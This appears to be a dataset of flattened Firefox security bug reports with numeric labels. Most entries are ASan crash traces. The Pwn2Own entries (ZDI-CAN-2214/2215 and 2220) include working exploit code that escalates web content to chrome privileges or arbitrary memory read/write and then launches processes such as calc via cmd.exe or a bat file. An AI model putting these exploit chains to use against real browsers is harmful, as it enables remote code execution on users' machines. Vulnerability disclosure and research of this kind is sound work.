builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc 1 libmozalloc.so moz_xmalloc line 52 of builds/slave/m-in-l64-asan-0000000000000000/build/memory/mozalloc/mozalloc.cpp thread t3 socket thread created by t0 here 0 firefox pthread_create line 155 of builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc 1 libnspr4.so pr_createthread line 445 of builds/slave/m-in-l64-asan-0000000000000000/build/nsprpub/pr/src/pthreads/ptthread.c 2 libnspr4.so pr_createthread line 528 of builds/slave/m-in-l64-asan-0000000000000000/build/nsprpub/pr/src/pthreads/ptthread.c shadow bytes around the buggy address fa fa fa fa fa fa fa fa fd fd fd fd fa fa fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd fa fa fa fa fa fa fa fa 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fa fa fa fd fd fd fa fa fa fa fa fa fa fa fa fd fd fd fd fa fa 00 00 02 fa fa fa fd fd fd fa fa fa fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 fa fa fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 14607==aborting	11
memcpy buffer overrun when cairo_truetype_index_to_ucs4 calls cairo_dwrite_load_truetype_table user agent mozilla/5.0 windows nt 6.1 wow64 applewebkit/537.36 khtml like gecko chrome/32.0.1700.76 safari/537.36 steps to reproduce install the attached xpi which creates an ugly hello world top-level menu sorry i adapted one of your tutorials to get a simple reproduction on any web page e.g google s home page select the hello world menu item which really attempts to generate a pdf of the page to c temp\problem.pdf i m using the ff 26.0 on 64-bit windows 7 professional 32-bit version of ff though crash report details adapterdeviceid adaptervendorid add-ons support 40lastpass.com:3.0.12 printpages2pdf 40reinhold.ripper:0.1.9.3 helloworld com:0.1 7b972ce4c6-7e08-4474-a285-3208198ce6fd 7d:26.0 availablepagefile 20080398336 availablephysicalmemory 5977272320 availablevirtualmemory 3804106752 buildid 20131205075310 crashtime 1391120848 emcheckcompatibility true framepoisonbase 00000000f0de0000 framepoisonsize 65536 installtime 1387205692 notes adaptervendorid adapterdeviceid adaptersubsysid 21201028 adapterdriverversion 8.922.0.0 has dual gpus gpu 2 adaptervendorid2 adapterdeviceid2 adaptersubsysid2 05771028 adapterdriverversion2 8.15.10.2712d2d d2d dwrite dwrite d3d10 layers d3d10 layers productid ec8030f7-c20a-464f-9b0e-13a3a9e97384 productname firefox releasechannel release secondssincelastcrash 508 startuptime 1391120365 systemmemoryusepercentage 64 theme classic/1.0 throttleable 1 totalvirtualmemory 4294836224 url about home vendor mozilla version 26.0 winsock_lsp msafd tcpip tcp/ip 2 1 systemroot system32\mswsock.dll msafd tcpip udp/ip 2 2 msafd tcpip raw/ip 2 3 systemroot system32\mswsock.dll msafd tcpip tcp/ipv6 2 1 msafd tcpip udp/ipv6 2 2 systemroot system32\mswsock.dll msafd tcpip raw/ipv6 2 3 rsvp tcpv6 service provider 2 1 systemroot system32\mswsock.dll rsvp tcp service provider 2 1 rsvp udpv6 service provider 2 2 systemroot system32\mswsock.dll rsvp udp service provider 2 2 useragent_locale en-us actual results firefox crashes attaching a debugger i found that cairo_truetype_index_to_ucs4 allocates a 4-byte array buf and passes it to cairo_dwrite_load_truetype_table which loads over 8k of data and uses memcpy to copy it to that buffer this totally trashes the stack so you can see what is happening much better if you set a breakpoint to stop things before the memcpy in line 1057 of mozilla-release\gfx\cairo\cairo\src\cairo-dwrite-font.cpp expected results the current web page should be converted to pdf and written to c temp\problem.pdf this is not what i m really trying to do i really want to call this code through geckofx from net as in but i ve been trying to move things along by pinning down a simpler repro	7
out-of-bounds read in mozilla wavereader decodeaudiodata tested on os ubuntu 12.04 firefox asan build from repro-file as attachment you might need to load the wav-file with a small html wrapper like this html audio src repro-file.wav html asan-report 20648==error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 1 at thread t37 media decode 0 in mozilla anonymous namespace readuint8 char const builds/slave/m-cen-l64-asan-d-ntly-00000000/build/content/media/wave/wavereader.cpp:106:0 1 in mozilla wavereader decodeaudiodata builds/slave/m-cen-l64-asan-d-ntly-00000000/build/content/media/wave/wavereader.cpp:219:0 2 in mozilla mediadecoderreader decodetofirstaudiodata builds/slave/m-cen-l64-asan-d-ntly-00000000/build/content/media/mediadecoderreader.cpp:449:0 3 in mozilla mediadecoderreader findstarttime long builds/slave/m-cen-l64-asan-d-ntly-00000000/build/content/media/mediadecoderreader.cpp:474:0 4 in mozilla mediadecoderstatemachine findstarttime builds/slave/m-cen-l64-asan-d-ntly-00000000/build/content/media/mediadecoderstatemachine.cpp:2653:0 5 in mozilla mediadecoderstatemachine decodemetadata builds/slave/m-cen-l64-asan-d-ntly-00000000/build/content/media/mediadecoderstatemachine.cpp:1949:0 6 in mozilla mediadecoderstatemachine decodethreadrun builds/slave/m-cen-l64-asan-d-ntly-00000000/build/content/media/mediadecoderstatemachine.cpp:508:0 is located 0 bytes to the right of 4096-byte region allocated by thread t37 media decode here 0 in malloc asan_rtl_:0 1 in moz_xmalloc builds/slave/m-cen-l64-asan-d-ntly-00000000/build/memory/mozalloc/mozalloc.cpp:52:0 2 in operator new unsigned long builds/slave/m-cen-l64-asan-d-ntly-00000000/build/obj-firefox/content/media/wave dist/include/mozilla/mozalloc.h:213:0 3 in mozilla wavereader decodeaudiodata builds/slave/m-cen-l64-asan-d-ntly-00000000/build/content/media/wave/wavereader.cpp:207:0 4 in mozilla mediadecoderreader decodetofirstaudiodata builds/slave/m-cen-l64-asan-d-ntly-00000000/build/content/media/mediadecoderreader.cpp:449:0 5 in mozilla mediadecoderreader findstarttime long builds/slave/m-cen-l64-asan-d-ntly-00000000/build/content/media/mediadecoderreader.cpp:474:0	11
heap-buffer-overflow in read_u32 to reproduce visit 7222==error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 4 at thread t63 imagedecoder 2 0 in read_u32 gfx/qcms/iccread.c:100 1 in qcms_profile_from_memory gfx/qcms/iccread.c:1023 2 in mozilla image geticcprofile jpeg_decompress_struct image/decoders/nsjpegdecoder.cpp:68 3 in mozilla image nsjpegdecoder writeinternal char const unsigned int mozilla image decodestrategy image/decoders/nsjpegdecoder.cpp:258 4 in mozilla image decoder write char const unsigned int mozilla image decodestrategy image/src/decoder.cpp:107 5 in mozilla image rasterimage writetodecoder char const unsigned int mozilla image decodestrategy image/src/rasterimage.cpp:2148 6 in mozilla image rasterimage decodesomedata unsigned int mozilla image decodestrategy image/src/rasterimage.cpp:2779 7 in mozilla image rasterimage decodepool decodesomeofimage mozilla image rasterimage mozilla image decodestrategy mozilla image rasterimage decodepool decodetype unsigned int image/src/rasterimage.cpp:3419 8 in mozilla image rasterimage decodepool decodejob run image/src/rasterimage.cpp:3285 9 in nsthreadpool run xpcom/threads/nsthreadpool.cpp:208 10 in non-virtual thunk to nsthreadpool run objdir-ff-asan-sym/xpcom/threads/unified_cpp_xpcom_threads0.cpp:222 11 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:643 12 in ns_processnextevent nsithread bool xpcom/glue/nsthreadutils.cpp:263 13 in mozilla ipc messagepumpfornonmainthreads run base messagepump delegate ipc/glue/messagepump.cpp:303 14 in messageloop runinternal ipc/chromium/src/base/message_loop.cc:226 15 in messageloop runhandler ipc/chromium/src/base/message_loop.cc:219 16 in messageloop run ipc/chromium/src/base/message_loop.cc:193 17 in nsthread threadfunc void xpcom/threads/nsthread.cpp:258 18 in pt_root nsprpub/pr/src/pthreads/ptthread.c:205 19 in asan asanthread threadstart unsigned long asan_rtl 20 in start_thread build/buildd/eglibc-2.15/nptl/pthread_create.c:308 21 in is located 2 bytes to the right of 1-byte region allocated by thread t63 imagedecoder 2 here 0 in malloc asan_rtl 1 in read_icc_profile image/decoders/iccjpeg.c:163 2 in mozilla image geticcprofile jpeg_decompress_struct image/decoders/nsjpegdecoder.cpp:67 3 in mozilla image nsjpegdecoder writeinternal char const unsigned int mozilla image decodestrategy image/decoders/nsjpegdecoder.cpp:258 4 in mozilla image decoder write char const unsigned int mozilla image decodestrategy image/src/decoder.cpp:107 5 in mozilla image rasterimage writetodecoder char const unsigned int mozilla image decodestrategy image/src/rasterimage.cpp:2148 6 in mozilla image rasterimage decodesomedata unsigned int mozilla image decodestrategy image/src/rasterimage.cpp:2779 7 in mozilla image rasterimage decodepool decodesomeofimage mozilla image rasterimage mozilla image decodestrategy mozilla image rasterimage decodepool decodetype unsigned int image/src/rasterimage.cpp:3419 8 in mozilla image rasterimage decodepool decodejob run image/src/rasterimage.cpp:3285 9 in nsthreadpool run xpcom/threads/nsthreadpool.cpp:208 10 in non-virtual thunk to nsthreadpool run objdir-ff-asan-sym/xpcom/threads/unified_cpp_xpcom_threads0.cpp:222 11 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:643 12 in ns_processnextevent nsithread bool xpcom/glue/nsthreadutils.cpp:263 13 in mozilla ipc messagepumpfornonmainthreads run base messagepump delegate ipc/glue/messagepump.cpp:303 14 in messageloop runinternal ipc/chromium/src/base/message_loop.cc:226 15 in messageloop runhandler ipc/chromium/src/base/message_loop.cc:219 16 in messageloop run ipc/chromium/src/base/message_loop.cc:193 17 in nsthread threadfunc void xpcom/threads/nsthread.cpp:258 18 in pt_root nsprpub/pr/src/pthreads/ptthread.c:205 19 in asan asanthread threadstart unsigned long asan_rtl thread t63 imagedecoder 2 created by t0 here 0 in interceptor_pthread_create asan_rtl 1 in pr_createthread nsprpub/pr/src/pthreads/ptthread.c:445 2 in pr_createthread nsprpub/pr/src/pthreads/ptthread.c:528 3 in nsthread init xpcom/threads/nsthread.cpp:329 4 in nsthreadmanager newthread unsigned int unsigned int nsithread xpcom/threads/nsthreadmanager.cpp:232 5 in nsthreadpool putevent nsirunnable xpcom/threads/nsthreadpool.cpp:92 6 in nsthreadpool dispatch nsirunnable unsigned int xpcom/threads/nsthreadpool.cpp:246 7 in nsinputstreamreadyevent oninputstreamready nsiasyncinputstream xpcom/io/nsstreamutils.cpp:72 8 in non-virtual thunk to nsinputstreamreadyevent oninputstreamready nsiasyncinputstream objdir-ff-asan-sym/xpcom/io/unified_cpp_xpcom_io1.cpp:79 9 in nspipeevents nspipeevents xpcom/io/nspipe3.cpp:592 10 in nspipeinputstream asyncwait nsiinputstreamcallback unsigned int unsigned int nsieventtarget xpcom/io/nspipe3.cpp:854 11 in nsinputstreampump ensurewaiting netwerk/base/src/nsinputstreampump.cpp:142 12 in nsinputstreampump oninputstreamready nsiasyncinputstream netwerk/base/src/nsinputstreampump.cpp:475 13 in non-virtual thunk to nsinputstreampump oninputstreamready nsiasyncinputstream objdir-ff-asan-sym/netwerk/base/src/unified_cpp_netwerk_base_src1.cpp:490 14 in nsinputstreamreadyevent run xpcom/io/nsstreamutils.cpp:85 15 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:643 16 in ns_processnextevent nsithread bool xpcom/glue/nsthreadutils.cpp:263 17 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:95 18 in messageloop runinternal ipc/chromium/src/base/message_loop.cc:226 19 in messageloop runhandler ipc/chromium/src/base/message_loop.cc:219 20 in messageloop run ipc/chromium/src/base/message_loop.cc:193 21 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:161 22 in nsappstartup run toolkit/components/startup/nsappstartup.cpp:276 23 in xremain xre_mainrun toolkit/xre/nsapprunner.cpp:4090 24 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:4158 25 in xre_main toolkit/xre/nsapprunner.cpp:4368 26 in do_main int char nsifile browser/app/nsbrowserapp.cpp:280 27 in main browser/app/nsbrowserapp.cpp:648 28 in libc_start_main build/buildd/eglibc-2.15/csu/libc-start.c:226 shadow bytes around the buggy address fa fa fd fd fa fa fd fa fa fa 00 00 fa fa 00 fa fa fa 00 00 fa fa fd fa fa fa 00 00 fa fa 00 fa fa fa 00 00 fa fa fd fa fa fa 00 00 fa fa 00 fa fa fa 00 00 fa fa fd fd fa fa fd fa fa fa 00 00 fa fa 00 00 fa fa 00 fa fa fa 00 00 fa fa 00 fa fa fa 00 00 fa fa 00 fa fa fa 00 00 fa fa 01 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fa fa fa 00 02 fa fa 00 00 fa fa 00 fa fa fa fd fa fa fa 00 00 fa fa 00 04 fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 7222==aborting	11
privilege content loading zdi-can-2214 tl dr it is possible for untrusted web content to load a chrome-privileged page by getting js-implemented webidl to call window.open a system-principal page loaded in an iframe can then be exploited to bypass the pop-up blocker by invoking document.open from the unloaded window this allows web content to open chrome browser/content/browser.xul in a chrome window with the opener reference pointing to a content iframe as a result a user-controlled javascript uri can be loaded with the system principal which allows arbitrary code execution 1 privileged content loading chrome pages in firefox load with the system security principal which provides access to all browser functionalities including launching of arbitrary local files with command line arguments the browser is expected to prevent websites from loading privileged pages otherwise a uxss bug may lead to arbitrary code execution when window.open is called its c implementation nsglobalwindow openinternal delegates the security check to nsglobalwindow securitycheckurl nsglobalwindow.cpp nsglobalwindow securitycheckurl const char aurl jscontext cxused bool freepass nscomptr nsiuri uri if ns_failed buildurifrombase aurl getter_addrefs uri freepass cxused return ns_error_failure autopushjscontext cx cxused if freepass ns_failed nscontentutils getsecuritymanager checkloadurifromscript cx uri return ns_error_failure return ns_ok the noteworthy thing here is that the loaded uri is n't checked when the freepass flag is set to true the reference to it is passed to nsglobalwindow buildurifrombase which does the following nsglobalwindow.cpp nsglobalwindow buildurifrombase const char aurl nsiuri abuilturi bool afreesecuritypass jscontext acxused nsiscriptcontext scx getcontextinternal jscontext cx nullptr abuilturi nullptr afreesecuritypass false if acxused acxused nullptr get jscontext ns_assertion scx opening window missing its context ns_assertion mdoc opening window missing its document if scx mdoc return ns_error_failure nscomptr nsidomchromewindow chrome_win do_queryobject this if nscontentutils iscallerchrome chrome_win if open is called from chrome on a non-chrome window we ll use the context from the window on which open is being called to prevent giving chrome priveleges to new windows opened in such a way this also makes us get the appropriate base uri for the below uri resolution code cx scx getnativecontext else get the jscontext from the call stack cx nscontentutils getcurrentjscontext nscomptr nspidomwindow sourcewindow if cx nsiscriptcontext scriptcx nsjsutils getdynamicscriptcontext cx if scriptcx sourcewindow do_queryinterface scriptcx getglobalobject if sourcewindow sourcewindow this afreesecuritypass true if acxused acxused cx return ns_newuri abuilturi nsdependentcstring aurl charset.get baseuri the free pass is granted when it s impossible to determine the window associated with the script context of the call in theory this can happen in 2 cases when there s no native script context cx on the stack or it has no related dynamic script context scriptcx it s the latter case which is interesting whether or not a native script context jscontext class links to a dynamic script context depends on how the jscontext was created and is indicated by the privateisnsisupports option in the related contextoptions object for instance contexts created as part of docshell initialization in the nsjscontext constructor are always set up with a dynamic script context this is not the case with contexts created in other places for example via xpcjscontextstack getsafejscontext if one of those ends up calling content-side window.open with the provided arguments the uri security check can be bypassed one way to achieve that is to use js-implemented webidl it s windowless instead a backstagepass object is used as a shim for the script global object whenever it s executed the initial call setup pushes a jscontext from xpcjscontextstack getsafejscontext because backstagepass does n't implement the nsiscriptglobalobject interface necessary to derive a jscontext from it the exploit uses webrtc peer connection callbacks as a short and simple method of getting js-implemented webidl to call a user-supplied function new mozrtcpeerconnection createoffer map open.bind window chrome browser/content i if createoffer is called on a connection without any attached mediastreams the error callback passed in as the second argument is later invoked from peerconnection.js peerconnection.js createoffer function onsuccess onerror constraints this._oncreateoffersuccess onsuccess this._oncreateofferfailure onerror the bound window.open this._getpc createoffer constraints oncreateoffererror function code message this.callcb this._dompc._oncreateofferfailure new rtcerror code message this._dompc._executenext callcb function callback arg if callback try callback arg is invoked here catch e this causes nsglobalwindow openinternal to be called while the current jscontext has no dynamic script context as a result the free security pass is erroneously granted and a system-principal page chrome browser/content/browser.xul is opened in the iframe named i a side note in theory nsglobalwindow buildurifrombase could choose to use a different jscontext the one associated with the window open is being called on nsglobalwindow.cpp if nscontentutils iscallerchrome chrome_win cx scx getnativecontext derived from the window else cx nscontentutils getcurrentjscontext the context of js-implemented webidl however even though js-implemented webidl code is chrome-privileged nscontentutils iscallerchrome returns false this is caused by the fact that during the call to mozrtcpeerconnection.createoffer the reference to the bound window.open function is wrapped in a cross-compartment wrapper as soon as the callback is called the content compartment of the wrapped function is entered causing subsequent nscontentutils iscallerchrome calls to return false	9
popup blocker bypass zdi-can-2215 2 pop-up blocker bypass even after frame navigation the unloaded window can still execute scripts provided that the parent window holds a reference to a method such as eval obviously it s limited in what it can do for example all methods that forward operation from the inner window window per w3c to the outer window windowproxy per w3c will raise an exception nsglobalwindow.cpp define forward_to_outer method args err_rval pr_begin_macro if isinnerwindow nsglobalwindow outer getouterwindowinternal if hasactivedocument ns_warning outer inner window does not have active document no outer window available return err_rval return outer method args hasactivedocument checks for iscurrentinnerwindow which returns false for unloaded inner windows this prevents users from performing operations in the context of the outer window now potentially hosting a document from another origin this affects window.open among other things however for this particular method a workaround exists when document.open is called with 3 or more arguments the call is forwarded to window.open nshtmldocument.cpp nshtmldocument open jscontext unused const nsastring aurl const nsastring aname const nsastring afeatures bool areplace errorresult rv ns_assertion nscontentutils cancalleraccess static_cast nsidomhtmldocument this xow should have caught this nscomptr nsidomwindow window getwindow if window rv.throw ns_error_dom_invalid_access_err return nullptr nscomptr nsidomjswindow win do_queryinterface window nscomptr nsidomwindow newwindow xxxbz we ignore areplace for now rv win openjs aurl aname afeatures getter_addrefs newwindow return newwindow.forget here getwindow returns the outer window thus openjs is called directly on the outer window and forward_to_outer wo n't raise any error in nsglobalwindow openinternal this bug can be leveraged to open a new pop-up window when the outer window s active document is chrome-privileged nsglobalwindow.cpp bool nsglobalwindow popupwhitelisted if ispopupblocked mdoc mdoc is the xul document currently loaded in the frame return true bool ispopupblocked nsidocument adoc nscomptr nsipopupwindowmanager pm do_getservice ns_popupwindowmanager_contractid uint32_t permission nsipopupwindowmanager allow_popup pm testpermission adoc nodeprincipal permission permission is tested against the system principal return permission nsipopupwindowmanager deny_popup which allows pop-ups so this returns false when a chrome uri is opened in a new window and the chrome option is specified as the third argument to document.open the uri is opened in a type=chrome window chrome windows provide 2 important benefits a they define messagemanager which several chrome pages such as browser.xul require to function properly due to the missing messagemanager the browser.xul instance which was opened in the content frame threw a script error early on b javascript uris opened from such docshells can inherit the system principal the feature a allows browser.js a script file included from browser.xul to execute code responsible for reopening the sidebar from the opener window since the chrome window hosting browser.xul is being opened from an iframe in the content land the values browser.js will read from the opener including the uri of the sidebar are user-controlled the exploit replaces the contents of the opener iframe immediately after the call to document.open var s document.open chrome browser/content chrome location u where u is the uri of the data document containing the sidebar element img id sidebar src javascript code and a few others to ensure that browser.js does n't throw when it tries to read them via the opener reference the feature b mentioned above ensures that javascript code reopened in the chrome window s sidebar inherits the system-principal from the enclosing browser.xul document as soon as this happens the browser is compromised exploit here s the exploit code with some additional notes doctype html iframe name i style display none iframe 1 script i.u data text/html string function 2 form id sidebar-box sidebarcommand frame img name boxobject form 3 img id sidebar-title 4 img id sidebar 5 script var s document.getelementbyid sidebar s.src javascript c=components c=c.classes i=c.interfaces f=c mozilla.org/file/local 1 createinstance i.nsilocalfile p=c mozilla.org/process/util 1 createinstance i.nsiprocess f.initwithpath c windows\\\\system32\\\\cmd.exe p.init f p.run 0 kcalc.exe 1 top.close match s\s 1 script var s document.open chrome browser/content chrome location u 6 var e i.eval.bind 0 s var c new mozrtcpeerconnection c.createoffer map open.bind top chrome browser/content i 7 settimeout c.createoffer map e 1000 8 script 1 this is the iframe a chrome-privileged page will be loaded in no source is specified so it initially loads a same-origin about blank document it ll be used to call open on the outer window after the frame has navigated to the chrome page 2 the variable u stores the uri of the document which the chrome window will see as the opener below are its elements 3 this is to satisfy the following opener references in browser.js function gbrowserinit.onload let openersidebarbox window.opener.document.getelementbyid sidebar-box let sidebarcmd openersidebarbox.getattribute sidebarcommand let sidebarcmdelem document.getelementbyid sidebarcmd sidebarbox.setattribute width openersidebarbox.boxobject.width sidebarcmd must be a valid element id from the browser.xul document frame is the shortest one 4 this is to satisfy the following opener reference in browser.js function gbrowserinit.onload sidebartitle.setattribute value window.opener.document.getelementbyid sidebar-title getattribute value 5 this is the element whose src attribute contains the uri to be opened in the privileged context sidebarbox.setattribute src window.opener.document.getelementbyid sidebar getattribute src 6 code that will be executed in the about blank context after the frame has navigated to a chrome page it s ok if location is assigned after the call to document.open because it takes longer to open the chrome window than to load the data uri in the frame 7 the actual action starts here the first bug is exploited to open a privileged page in the frame 8 since 7 happens asynchronously the next step must be delayed the chrome page must be loaded before the pop-up blocker bypass with document.open is attempted but there s one more reason to wait related to how garbage collection works in firefox shortly after the about blank document is navigated away all chrome-to-content object wrappers are nuked and replaced with a deadobjectproxy which throws on every access if gc occured after the bound eval had been wrapped in the call to createoffer but before the error callback is invoked the exploit would fail a 1000ms timeout provides plenty of time for both navigation and gc also note that the free security pass bug must be reused because document.open would fail to open a privileged page without it even if open is called on the outer window with a privileged document the chrome compartment is never entered so a separate bypass is needed to ensure that the chrome uri is accepted	11
oom in typeobject sweep leaves pointers dangling vupen pwn2own zdi-can-2219 no description provided	11
typedarrayobject.cpp does n't take into account that arraybuffers can be neutered zdi-can-2220 pwn2own 2014 firefox exploit by jüri aedla the bug code in js/src/vm/typedarrayobject.cpp does n't take into account that arraybuffers can be neutered neutering sets arraybuffer length to zero quite a few functions are probably vulnerable i tested typedarrayobjecttemplate fun_subarray_impl and dataviewobject write fun_subarray_impl does uint32_t length tarray length if toclampedindex cx args 1 length end jsobject nobj createsubarray cx tarray begin end it stores the array length and then reads the value of args 1 if args 1 is an object its valueof is called so attacker gets control attacker can then neuter the array so its length becomes zero now fun_subarray_impl proceeds with an invalid length and creates a large subarray of an empty array the subarray is returned to the attacker so he gets an oob chunk which he can read/write the oob chunk lies in javascript heap normally large arraybuffer contents are allocated externally but as the arraybuffer is neutered arraybufferobject changecontents resets the elements pointer to fixedelements which points into the arraybuffer object itself allocated in js heap so the attacker can now read/write an oob chunk in js heap exploit the exploit consists of two components code under neuter achieves arbitrary read/write and leaks a pointer to data section it is wrapped in a rw module which has functions readu8 writeu8 and leakptr second part of the code under libexp takes the rw module and executes calc it is reusable arbitrary read/write the exploit escalates the read/write of js heap chunk into arbitrary read/write by taking control over a uint8array uint8array is a nice target because one of its slots is pointer to data by overwriting this pointer we can read/write arbitrary locations so the expoit creates a neuterable arraybuffer this.unused.push this.audio_context.createbuffer 1 conf.oob_size_u32 96000 this.audio_buffer this.unused.pop then it creates 500000 uint8arrays for var i 0 i conf.num_views i this.views.push new uint8array this.buffer_for_views conf.magic_offset conf.magic_length the magic_offset is 20 random bits which make it easy to search for the views from the oob block now we create a subarray of an uint32array which wraps a neuterable arraybuffer var view_f32 this.audio_buffer.getchanneldata 0 var array_buffer view_f32.buffer var view_u32_tmp new uint32array array_buffer this.oob view_u32_tmp.subarray 0 end the end is an object whose valueof neuters the arraybuffer var convolver this.audio_context.createconvolver convolver.buffer this.audio_buffer so oob memory block can now be accessed via this.oob let s search for any uint8array for var i 0 i this.oob.length i if this.oob i this.byteoffsetslot this.conf.magic_offset this.oob i this.bytelengthslot this.conf.magic_length break then determine which one we found this.oob this.slotoffset this.byteoffsetslot for var i 0 i this.views.length i if this.views i byteoffset this.conf.magic_offset 1 break we can now overwrite the data pointer of found uint8array let s implement readu8 this.setaddress address return this.rw_view 0 setaddress overwrites the data pointer this.writepointerslot this.dataslot address which does var offset this.slotoffset slot this.oob offset pointer.low if platform.is64bitbrowser this.oob offset 1 pointer.high writeu8 is similar now to break aslr we basically read uint8array type clasp which points into static typedarrayobject classes the classes array lies in the data section of mozjs.dll so we find where mozjs.dll is var type_address this.readpointerslot this.typeslot var type new variable this type_address this.type_object_type this.leaked_ptr type.clasp.read the rw module is now complete btw the variable above is a helper object that can read/write different integer types pointers struct fields the first argument to variable is the rw module second is the variable address third is variable type the type_object_type is defined as this.type_object_type kind struct fields clasp offset 0 type variable.pointer so we re declaring a struct with clasp pointer field at offset 0 getting components now to escalate arbitrary read/write into privileged javascript for that the exploit creates the security.turn_off_all_security_so_that_viruses_can_take_over_this_co mputer pref entry once we have this entry new iframes will have netscape.security.privilegemanager attached once we have that we can get the components object netscape.security.privilegemanager.enableprivilege this gives us the privileged components object which enables us to access the filesystem and launch processes here s the code creates the pref entry var key security.turn_off_all_security_so_that_viruses_can_take_over_this_computer var hash var key_string this.memory.allocatestring key address var hash_table this.memory.getvariable xul ghashtable this.hash_table_type var hash_shift hash_table.hash_shift.readjsnum var entry_index u32shr hash hash_shift var entry hash_table.entry_store.derefat entry_index entry.key_hash.writejsnum hash entry.key.write key_string entry.user_pref.writejsnum 1 entry.flags.writejsnum return entry so we calculate the entry_index and fill out key_hash key user_pref and flags of the entry executing calc once we have the privileged components we execute calc var file this.createclass file/local nsifile var stream this.createclass network/file-output-stream nsifileoutputstream var process this.createclass process/util nsiprocess var command this.getcommand file.initwithpath this.getshellscriptpath stream.init file this.wronly this.createfile this.truncate 0755 0 stream.write command command.length stream.close process.init file process.run true 0 file.remove false where command start calc and getshellscriptpath creates a temporary path for a bat file so we create a bat file write start calc inside and launch it	11
zdi-can-2225 vmtypedarrayobject.cpp dst ptr is checked the length is not checked no description provided	11
iframe sandboxing does n't work if the load is redirected iframe sandbox src something-that-redirects does n't sandbox because we do sandboxing via setting a nullprincipal owner and redirects do n't propagate it i ll attach a mochitest that shows the bug properly fixing bug 965413 will automagically fix this but we may want some sort of branch backports	5
arbitrary code execution from web notifications there s no security check for the icon url in notifications as a result pages with the notification permission can run arbitrary code websites with no such privilege can try clickjacking especially that there s no security delay on the notification prompt	2
asan heap-use-after-free in nsgenerichtmlelement getwidthheightforimage the attached test case crashes the latest asan build of firefox asan output attached in crash.txt the imgloader object is freed while setting a new src in the onresize event handler	11
global-buffer-overflow in nsxblprotoimpl installimplementation i have fuzzpriv extension that makes this easier to reproduce 359==error addresssanitizer global-buffer-overflow on address at pc bp sp read of size 4 at thread t0 0 in hold dom/xbl/nsxblservice.h:159 1 in addref dom/xbl/nsxblservice.h:161 2 in assign_with_addref objdir-ff-asan/dom/xbl dist/include/nsautoptr.h:865 3 in operator objdir-ff-asan/dom/xbl dist/include/nsautoptr.h:957 4 in fromjsclass dom/xbl/nsxblbinding.h:73 5 in nsxblprotoimpl installimplementation nsxblprototypebinding nsxblbinding dom/xbl/nsxblprotoimpl.cpp:66 6 in nsxblservice loadbindings nsicontent nsiuri nsiprincipal nsxblbinding bool dom/xbl/nsxblservice.cpp:516 7 in nscssframeconstructor addframeconstructionitemsinternal nsframeconstructorstate nsicontent nsiframe nsiatom int bool nsstylecontext unsigned int nstarray nsianonymouscontentcreator contentinfo nscssframeconstructor frameconstructionitemlist layout/base/nscssframeconstructor.cpp:5207 8 in nscssframeconstructor buildinlinechilditems nsframeconstructorstate nscssframeconstructor frameconstructionitem bool bool layout/base/nscssframeconstructor.cpp:10714 9 in nscssframeconstructor addframeconstructionitemsinternal nsframeconstructorstate nsicontent nsiframe nsiatom int bool nsstylecontext unsigned int nstarray nsianonymouscontentcreator contentinfo nscssframeconstructor frameconstructionitemlist layout/base/nscssframeconstructor.cpp:5394 10 in nscssframeconstructor addframeconstructionitems nsframeconstructorstate nsicontent bool nsiframe nscssframeconstructor frameconstructionitemlist layout/base/nscssframeconstructor.cpp:5148 11 in nscssframeconstructor contentappended nsicontent nsicontent bool layout/base/nscssframeconstructor.cpp:6748 12 in nscssframeconstructor createneededframes nsicontent layout/base/nscssframeconstructor.cpp:6427 13 in nscssframeconstructor createneededframes nsicontent layout/base/nscssframeconstructor.cpp:6434 14 in nscssframeconstructor createneededframes nsicontent layout/base/nscssframeconstructor.cpp:6434 15 in nscssframeconstructor createneededframes layout/base/nscssframeconstructor.cpp:6449 16 in presshell flushpendingnotifications mozilla changestoflush layout/base/nspresshell.cpp:4042 17 in nsrefreshdriver tick long mozilla timestamp layout/base/nsrefreshdriver.cpp:1142 18 in tickdriver layout/base/nsrefreshdriver.cpp:168 19 in mozilla refreshdrivertimer tick layout/base/nsrefreshdriver.cpp:160 20 in nstimerimpl fire xpcom/threads/nstimerimpl.cpp:551 21 in nstimerevent run xpcom/threads/nstimerimpl.cpp:635 22 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:694 23 in ns_processnextevent nsithread bool xpcom/glue/nsthreadutils.cpp:263 24 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:95 25 in runinternal ipc/chromium/src/base/message_loop.cc:226 26 in runhandler ipc/chromium/src/base/message_loop.cc:219 27 in messageloop run ipc/chromium/src/base/message_loop.cc:193 28 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:164 29 in nsappstartup run toolkit/components/startup/nsappstartup.cpp:276 30 in xremain xre_mainrun toolkit/xre/nsapprunner.cpp:4019 31 in 